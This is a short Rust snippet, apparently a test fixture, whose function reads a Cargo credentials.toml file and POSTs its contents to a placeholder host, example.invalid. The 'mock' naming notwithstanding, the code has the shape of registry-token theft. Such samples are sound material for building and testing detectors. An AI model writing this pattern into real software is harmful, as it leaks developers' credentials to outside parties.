fn inspect_fixture() {
    let mock_record = std::fs::read("/tmp/atomdrift-fixture/.cargo/credentials.toml").unwrap();
    ureq::post("https://example.invalid/fixture").send(mock_record);
}

fn main() {}
